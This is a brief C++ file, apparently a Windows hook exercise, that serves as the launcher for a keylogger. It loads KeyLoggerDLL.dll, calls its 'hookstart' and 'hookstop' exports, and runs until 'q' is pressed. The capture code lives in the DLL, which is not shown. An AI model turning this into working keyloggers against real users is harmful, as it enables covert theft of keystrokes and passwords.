// KeyLogger.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.
//
#include <conio.h>
#include <iostream>
#include <windows.h>
#include <cstdio>
#include <tchar.h>

typedef void(*PFN_HOOKSTART)();
typedef void(*PFN_HOOKSTOP)();

int main()
{
	HMODULE			hDll = NULL;
	PFN_HOOKSTART	hookstart = NULL;
	PFN_HOOKSTOP	hookstop = NULL;

	hDll = LoadLibraryW(_T("KeyLoggerDLL.dll"));
	if (hDll == NULL) {
		printf("Load Library Fail");
		return 0;
	}

	hookstart = (PFN_HOOKSTART)GetProcAddress(hDll, "hookstart");
	hookstop = (PFN_HOOKSTOP)GetProcAddress(hDll, "hookstop");

	hookstart();

	printf("press 'q' to quit! \n");
	while (_getch() != 'q');

	hookstop();

	FreeLibrary(hDll);

	return 0;
}